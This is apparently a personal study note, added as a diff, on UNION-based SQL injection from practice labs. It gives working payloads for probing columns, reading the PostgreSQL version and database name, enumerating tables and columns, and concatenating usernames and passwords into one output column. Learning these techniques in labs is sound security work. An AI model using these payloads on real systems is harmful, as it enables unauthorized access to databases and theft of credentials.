@@ -1,0 +1,114 @@
+# UNION-Based SQL Injection
+
+## Overview
+
+UNION-based SQL Injection allows an attacker to combine the results of the original SQL query with another query using the `UNION` operator.  
+This technique can be used to retrieve sensitive data from the database.
+
+---
+
+# Why NULL is Used in UNION Attacks
+
+`NULL` is commonly used when testing UNION queries because:
+
+- It is compatible with most data types
+- Helps avoid datatype mismatch errors
+- Makes testing easier
+
+Example:
+
+' UNION SELECT NULL,NULL,NULL--
+
+---
+
+# Finding the Output Column
+
+To determine which column is reflected in the webpage, attackers inject test values.
+
+Example payloads:
+
+' UNION SELECT 'test',NULL,NULL--
+' UNION SELECT NULL,'test',NULL--
+' UNION SELECT NULL,NULL,'test'--
+
+If the value **test** appears on the page, that column is the **output column**.
+
+---
+
+# Extracting Database Version
+
+Once the output column is identified, database information can be extracted.
+
+Example:
+
+' UNION SELECT NULL,version(),NULL--
+
+Example output:
+
+PostgreSQL 13.4
+
+---
+
+# Extracting Database Name (PostgreSQL)
+
+To retrieve the current database name in PostgreSQL:
+
+' UNION SELECT NULL,current_database(),NULL--
+
+Example output:
+
+academy_labs
+
+---
+
+# Enumerating Tables
+
+To retrieve table names from the database:
+
+' UNION SELECT NULL,table_name,NULL
+FROM information_schema.tables--
+
+To filter only application tables:
+
+' UNION SELECT NULL,table_name,NULL
+FROM information_schema.tables
+WHERE table_schema='public'--
+
+---
+
+# Enumerating Columns
+
+To retrieve column names from a specific table:
+
+' UNION SELECT NULL,column_name,NULL
+FROM information_schema.columns
+WHERE table_name='users'--
+
+Example output:
+
+username
+password
+
+---
+
+# Extracting Multiple Values in One Column
+
+If there is only one output column available, multiple values can be combined.
+
+Example:
+
+' UNION SELECT NULL,username || ':' || password
+FROM users--
+
+Example output:
+
+administrator:3f8d9h2d9h2
+
+---
+
+# Labs Practiced
+
+- SQL injection UNION attack: Finding a column containing text
+- SQL injection UNION attack: Retrieving data from other tables
+- SQL injection UNION attack: Retrieving multiple values in a single column
+- SQL injection attack: Querying the database type and version
